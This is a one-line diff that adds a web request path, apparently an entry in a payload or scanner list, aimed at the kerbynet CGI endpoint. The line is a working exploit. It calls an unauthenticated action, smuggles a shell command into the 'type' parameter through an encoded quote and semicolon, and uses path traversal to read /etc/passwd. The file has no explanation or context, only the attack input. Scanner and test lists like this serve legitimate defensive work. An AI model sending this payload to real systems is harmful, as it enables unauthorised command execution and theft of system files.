@@ -1,0 +1,1 @@
+/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22
